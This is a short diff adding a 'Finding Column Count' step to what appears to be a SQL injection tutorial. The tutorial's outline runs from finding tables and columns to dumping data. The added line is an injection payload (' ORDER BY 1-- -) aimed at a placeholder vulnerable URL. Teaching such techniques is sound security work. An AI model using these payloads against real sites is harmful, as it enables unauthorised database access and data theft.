@@ -28,3 +28,9 @@
 - Finding Tables
 - Finding Columns Of Table Or Tables
 - Dump Data
+
+
+**Finding Column Count**
+```
+https://vuln-web.vuln/product.php?id=1' ORDER BY 1-- -
+```
